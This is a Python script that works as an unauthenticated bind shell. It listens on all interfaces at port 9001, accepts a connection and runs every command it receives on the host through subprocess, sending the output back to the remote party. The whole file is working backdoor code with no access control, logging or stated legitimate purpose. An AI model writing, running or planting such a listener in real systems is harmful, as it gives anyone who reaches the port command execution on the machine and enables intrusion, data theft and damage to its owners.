import sys
import os
import socket
import subprocess
import time
import getopt

ip = "0.0.0.0"
port = 9001

def main():
    global ip, port

    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((ip,port))
    s.listen(1)
    connection, addr = s.accept()
    print("[*] Connection is established | %s:%s"%(addr[0],addr[1]))
    # try to print current working directory
    p = subprocess.Popen(["pwd"],stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
    o , _ = p.communicate()

    connection.send(o)

    while True:
        try:
            inpt = connection.recv(2048).decode()
            # connection.send(inpt.encode())
            if inpt == "exit":
                break
            try:
                if inpt.index("cd") >= 0:
                    # print('masuk')
                    goto = inpt.split(" ")
                    if(len(goto) > 2 or len(goto) == 0):
                        connection.send("Invalid parameter for cd".encode())
                    else:
                        try:
                            os.chdir(goto[1])
                            connection.send("Successfully changed directory".encode())
                            # print(goto)
                            p = subprocess.Popen(["pwd"],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
                            o,e = p.communicate()
                            if o == b'':
                                connection.send("error : ".encode() + e)
                            else:
                                connection.send("pwd:".encode() + o)
                        except FileNotFoundError:
                            connection.send("Invalid folder for cd".encode())
            except ValueError :
                p = subprocess.Popen(inpt.strip().split(" "),stdout=subprocess.PIPE,stderr=subprocess.PIPE)
                o,e = p.communicate()
                if o == b'':
                    connection.send("error : ".encode() + e)
                else:
                    connection.send("output: ".encode() + o)
        except:
            connection.send("Invalid command".encode())
    
    connection.close()

main()